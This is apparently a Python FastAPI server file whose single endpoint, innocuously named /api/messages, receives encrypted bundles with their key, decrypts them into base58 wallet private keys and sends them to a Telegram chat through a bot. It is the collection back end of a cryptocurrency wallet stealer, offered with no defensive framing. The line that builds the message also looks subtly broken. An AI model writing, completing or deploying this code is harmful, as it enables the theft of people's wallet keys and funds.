import base64
import os
import requests
from fastapi import FastAPI, Request
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

app = FastAPI()

BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")


def bytes_to_base58(b):
    num = int.from_bytes(b, 'big')
    encode = ''
    while num > 0:
        num, rem = divmod(num, 58)
        encode = BASE58_ALPHABET[rem] + encode
    pad = 0
    for byte in b:
        if byte == 0:
            pad += 1
        else:
            break
    return '1' * pad + encode


@app.get("/api/messages")
async def receive_data(bundles: str, keybundle: str, request: Request):
    sbundles = bundles.split(",")
    key = base64.b64decode(keybundle)
    aesgcm = AESGCM(key)

    privkeys = []
    for sbundle in sbundles:
        try:
            iv_b64, encrypted_b64 = sbundle.split(":")
            iv = base64.b64decode(iv_b64)
            ciphertext = base64.b64decode(encrypted_b64)
            decrypted = aesgcm.decrypt(iv, ciphertext, None)
            b58_priv = bytes_to_base58(decrypted)
            privkeys.append(b58_priv)
        except Exception:
            continue

    message = "\n".join([f"Wallet {i+1}:", key] for i, key in enumerate(privkeys))

    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message
        }
        try:
            requests.post(url, data=payload)
        except Exception:
            pass

    return {"status": "ok"}
